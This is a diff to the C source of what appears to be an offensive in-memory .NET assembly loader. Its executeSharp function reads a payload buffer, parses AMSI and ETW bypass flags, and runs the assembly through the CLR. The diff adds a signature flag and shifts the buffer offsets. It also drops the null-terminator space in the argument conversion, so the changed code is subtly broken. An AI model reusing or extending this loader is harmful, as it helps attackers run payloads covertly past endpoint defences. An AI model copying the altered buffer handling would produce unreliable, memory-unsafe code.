@@ -21,6 +21,7 @@
 
 unsigned char amsiflag[1];
 unsigned char etwflag[1];
+unsigned char signflag[1];
 
 char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
 char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };
@@ -107,7 +108,7 @@ int executeSharp(LPVOID lpPayload)
 	}
 	
 	//Reading memory parameters + amsiflag + args + assembly
-	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 9, &readed);
+	ReadProcessMemory(GetCurrentProcess(), lpPayload , allData, raw_assembly_length + raw_args_length + 11, &readed);
 
 	//Taking pointer to amsi
 	unsigned char *offsetamsi = allData + 8;
@@ -117,14 +118,18 @@ int executeSharp(LPVOID lpPayload)
 	unsigned char *offsetetw = allData + 9;
 	//Store amsi flag 
 	memcpy(etwflag, offsetetw, 1);
+
+	unsigned char *offsetsign = allData + 10;
+	//Store sihnature flag 
+	memcpy(signflag, offsetsign, 1);
 	
 	//Taking pointer to args
-	unsigned char *offsetargs = allData + 10;
+	unsigned char *offsetargs = allData + 11;
 	//Store parameters 
 	memcpy(arg_s, offsetargs, raw_args_length);
 
 	//Taking pointer to assembly
-	unsigned char *offset = allData + raw_args_length + 10;
+	unsigned char *offset = allData + raw_args_length + 11;
 	//Store assembly
 	memcpy(pvData, offset, raw_assembly_length);
 
@@ -266,16 +271,16 @@ int executeSharp(LPVOID lpPayload)
 	vtPsa.vt = (VT_ARRAY | VT_BSTR);
 
 	//Managing parameters
-	if(raw_args_length > 1)
+	if(signflag[0] == '\x02')
 	{
 		//if we have at least 1 parameter set cEleemnt to 1
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 
 		LPWSTR *szArglist;
 		int nArgs;
-		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length +1));
+		wchar_t *wtext = (wchar_t *)malloc((sizeof(wchar_t) * raw_args_length));
 
-		mbstowcs(wtext, (char *)arg_s, raw_args_length + 1);
+		mbstowcs(wtext, (char *)arg_s, raw_args_length);
 		szArglist = CommandLineToArgvW(wtext, &nArgs);
 
 		free(wtext);
